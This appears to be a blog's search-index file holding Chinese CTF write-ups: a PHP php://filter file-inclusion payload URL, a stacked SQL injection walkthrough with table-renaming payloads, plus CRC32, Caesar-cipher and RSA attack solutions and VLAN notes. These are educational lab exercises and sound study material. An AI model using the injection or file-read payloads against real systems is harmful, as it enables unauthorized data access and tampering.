href="#21-7-16-ACTF2020-新生赛-Include" class="headerlink" title="21-7-16 [ACTF2020 新生赛]Include"></a>21-7-16 [ACTF2020 新生赛]Include</h2><p>php伪协议，没搞懂原理，网上的教程讲的太垃圾<br><a href="http://e192d71b-cd70-4aa9-a451-189e693367fb.node4.buuoj.cn/?file=flag.php">http://e192d71b-cd70-4aa9-a451-189e693367fb.node4.buuoj.cn/?file=flag.php</a></p><p>构造payload,读取源代码并base64编码，防止被当作php代码执行<br>使用php://filter/read=convert.base64-encode/resource=xxx.php</p><p><a href="http://e192d71b-cd70-4aa9-a451-189e693367fb.node4.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php">http://e192d71b-cd70-4aa9-a451-189e693367fb.node4.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p>]]></content>
      
      
      <categories>
          
          <category> buu_web刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu_web刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019强网杯_随便注</title>
      <link href="/2021/07/15/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/2021/07/15/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="第一步先找参数"><a href="#第一步先找参数" class="headerlink" title="第一步先找参数"></a>第一步先找参数</h2><p>  <img src="/img/web/buu/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E5%85%88%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0.png"></p><h3 id="判断是什么注入"><a href="#判断是什么注入" class="headerlink" title="判断是什么注入"></a>判断是什么注入</h3><h4 id="加’符号，报错，后面加-，正常，字符型注入"><a href="#加’符号，报错，后面加-，正常，字符型注入" class="headerlink" title="加’符号，报错，后面加 #，正常，字符型注入"></a>加’符号，报错，后面加 #，正常，字符型注入</h4><p><img src="/img/web/buu/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png"></p><h2 id="第二步判断字段数"><a href="#第二步判断字段数" class="headerlink" title="第二步判断字段数"></a>第二步判断字段数</h2><p><img src="/img/web/buu/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png"><br><img src="/img/web/buu/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png"></p><pre><code>字段数为3</code></pre><h3 id="尝试uoion注入，发现被过滤，但是没有过滤show函数"><a href="#尝试uoion注入，发现被过滤，但是没有过滤show函数" class="headerlink" title="尝试uoion注入，发现被过滤，但是没有过滤show函数"></a>尝试uoion注入，发现被过滤，但是没有过滤show函数</h3><p><img src="/img/web/buu/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png"></p><h3 id="使用堆叠注入，发现可行"><a href="#使用堆叠注入，发现可行" class="headerlink" title="使用堆叠注入，发现可行"></a>使用堆叠注入，发现可行</h3><p><img src="/img/web/buu/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png"></p><p>show tables;<br>    发现两个表，”1919810931114514”，”words”<br>    查看这两个表的字段</p><p>表名为数字时，要用反引号包起来查询</p><pre><code>show columns from `1919810931114514`;show columns from words;</code></pre><p>得到    <img src="/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" title=" "></p><h2 id="查询flag字段，有三种方式"><a href="#查询flag字段，有三种方式" class="headerlink" title="查询flag字段，有三种方式"></a>查询flag字段，有三种方式</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;</span><br><span class="line">rename table `words` to `test`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure><pre><code>1&#39; or &#39;1&#39; = &#39;1</code></pre><p><img src="/img/web/buu/2019%E5%BC%BA%E7%BD%91%E6%9D%AF_%E9%9A%8F%E4%BE%BF%E6%B3%A8/8.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Crc32</title>
      <link href="/2021/07/06/crc32/"/>
      <url>/2021/07/06/crc32/</url>
      
        <content type="html"><![CDATA[<h2 id="crc32碰撞"><a href="#crc32碰撞" class="headerlink" title="crc32碰撞"></a>crc32碰撞</h2><p>crc是校验码，每个不同内容的文件crc都会不一样<br>压缩包的密码爆破不出来，压缩包里面的内容大小很小只有几个字节，那么可以通过crc32碰撞，碰撞出压缩包里面的内容<br>在2021CISCN华中赛区的线下，杂项第一题就是CRC32碰撞<br><img src="/img/crypto/crc32/1.png"><br><img src="/img/crypto/crc32/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> crc32_crack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2021ciscn </tag>
            
            <tag> crc32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变异凯撒</title>
      <link href="/2021/05/28/%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92/"/>
      <url>/2021/05/28/%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92/</url>
      
        <content type="html"><![CDATA[<p>加密密文： <font color="green">afZ_r9VYfScOeO_UL^RWUc</font><br>密文中友下划线和数字，所以不是用的字母表进行的替换加密，猜测是用ASCII<br><img src="/img/crypto/ASCII.jpg"></p><p>由题目格式： flag{ } 可知</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th><th align="center">变化规律</th></tr></thead><tbody><tr><td align="center">a(97)</td><td align="center">f(102)</td><td align="center">+5</td></tr><tr><td align="center">f(102)</td><td align="center">l(108)</td><td align="center">+6</td></tr><tr><td align="center">Z(90)</td><td align="center">a(97)</td><td align="center">+7</td></tr><tr><td align="center">_(95)</td><td align="center">g(103)</td><td align="center">+8</td></tr></tbody></table><p>可以看出从第一个字符开始，每个字符的偏移量依次递增，<br>第一个字符 1+4 =5<br>第二个 2+4    =6<br>第三个 3+4    =7<br>……<br>第n个字符的偏移量为 n+4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = <span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">j = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">    <span class="built_in">print</span>( <span class="built_in">chr</span>( <span class="built_in">ord</span>(i)+j ),end=<span class="string">&#x27;&#x27;</span>)    //   <span class="built_in">ord</span>()函数把字符转换成ASCII码,<span class="built_in">chr</span>()函数把ASCII码转换成字符</span><br><span class="line">    j+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>结果为<font color="blue">flag{Caesar_variation}</font> </p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 变异凯撒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CISCN_rsa</title>
      <link href="/2021/05/19/2021_CISCN_rsa/"/>
      <url>/2021/05/19/2021_CISCN_rsa/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *    </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># _________________msg1_________________</span></span><br><span class="line"><span class="comment"># e=3，小明文攻击,c&lt;n,c=m**e+k*n,对c开三次方</span></span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">n = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(iroot(c+i*n,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>):           </span><br><span class="line">        <span class="built_in">print</span>(iroot(c+i*n,<span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;________________&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_________________msg2________________</span></span><br><span class="line"><span class="comment"># 相同的N，想到rsa共模攻击，e2、e3互质</span></span><br><span class="line"><span class="comment"># 即gcd(e2,e3)=1</span></span><br><span class="line"><span class="comment"># 通过扩展欧几里得算法 gmpy2.gcdext() 返回tuple元组，满足s[1]*e2+s[2]*e3=1</span></span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">n = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">c1 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">c2 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">s = gcdext(e2,e3)    </span><br><span class="line">m = <span class="built_in">pow</span>(c1,s[<span class="number">1</span>],n)*<span class="built_in">pow</span>(c2,s[<span class="number">2</span>],n)%n   <span class="comment">#获取明文m</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;________________&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_________________msg3_________________</span></span><br><span class="line"><span class="comment"># 考高位攻击，已知p的高位</span></span><br><span class="line"><span class="comment">#用sage跑p的值，得到p然后常规解法</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line">p = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits-p.nbits()</span><br><span class="line">p=p&lt;&lt;kbits</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;upper %d bits (of %d bits) is given&quot;</span> % (pbits-kbits, pbits))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"><span class="built_in">print</span>(p+<span class="built_in">int</span>(x0))</span><br><span class="line"></span><br><span class="line">c = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">p = <span class="number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span></span><br><span class="line">n=<span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line">q= n//p</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把msg用long_to_bytes函数逆回去，求出text</span></span><br><span class="line"><span class="comment">#python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">msg1 = <span class="number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span></span><br><span class="line">msg2 = <span class="number">4193305853284549103821195807609492624095031428085219879448342104337322945001387680236011960472296815293233144303730273979905837762067652913308898433728800864776794638198055607422503065410595894676740531680367227696622352026247676452540064020322619036125381146346603655445487695574824919137</span></span><br><span class="line">msg3 = <span class="number">978430871477569051989776547659020359721056838635797362474311886436116962354292851181720060000979143571198378856012391742078510586927376783797757539078239088349758644144812898155106623543650953940606543822567423130350207207895380499638001151443841997176299548692737056724423631882</span></span><br><span class="line"></span><br><span class="line">str1 = long_to_bytes(msg1)+long_to_bytes(msg2)+long_to_bytes(msg3)</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(str1).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># CISCN&#123;3943e8843a19149497956901e5d98639&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> 2021ciscn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2021ciscn </tag>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三种接口</title>
      <link href="/2021/05/03/%E4%B8%89%E7%A7%8D%E6%8E%A5%E5%8F%A3/"/>
      <url>/2021/05/03/%E4%B8%89%E7%A7%8D%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>交换机内部通过tag识别不同VLAN的流量，vlan数量：2的12次方，1-4094，0不能用，4095不能用</p><p>vlan已经不能满足使用，现在使用vxlan。</p><p>华为交换机上有4种链路类型：接入、干道、混杂（hybrid）、QinQ（dot1q-tunel）</p><p>使用哪种类型，要看如何处理数据帧（独享，共享，交叉）</p><p>access独享，trunk共享，hybrid交叉</p><blockquote><p>display port vlan activate</p></blockquote><h2 id="access"><a href="#access" class="headerlink" title="access"></a>access</h2><p>工作原理：以太帧出入交换机分向都是唯一的一个VLAN ID</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">端口接收后会添加VLAN</span> <span class="string">Tag，VLAN</span> <span class="string">ID和端口PVID相同</span></span><br><span class="line"><span class="string">端口转发数据前会移除VLAN</span> <span class="string">Tag</span></span><br></pre></td></tr></table></figure><h2 id="trunk"><a href="#trunk" class="headerlink" title="trunk"></a>trunk</h2><p>以太帧出入交换机方向多个VLAN</p><p>trunk默认仅仅允许VLAN 1通过</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">port</span> <span class="string">trunk</span> <span class="string">all-pass</span> <span class="string">vlan</span> <span class="number">2</span> <span class="string">to</span> <span class="number">4094</span> <span class="string">//trunk上允许vlan2到4094以TAG（携带标记）的方式通过，vlan1不携带tag</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trunk端口接收到帧时，如果该帧不包含Tag，将添加上端口的PVID；如果该帧包含Tag，则不改变。</span><br><span class="line">trunk端口发送该帧时，该帧的VLAN ID在trunk的允许列表中：若与PVID相同，则剥离Tag发送；若与PVID不同，则直接发送。</span><br></pre></td></tr></table></figure><h2 id="hybird"><a href="#hybird" class="headerlink" title="hybird"></a>hybird</h2><p>hybrid端口既可以连接主机，又可以连接交换机。</p><p>hybrid端口可以以tagged或untagged方式加入vlan。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">端口转发数据，查看untag表，表中存在，脱掉tag，放通数据。若没有，查看tag表，存在，放通数据。</span></span><br><span class="line"><span class="string">端口接收数据，无tag，打上pvid。若有标签，查看tag表，存在，放通数据。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 交换机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> access </tag>
            
            <tag> trunk </tag>
            
            <tag> hybrid </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
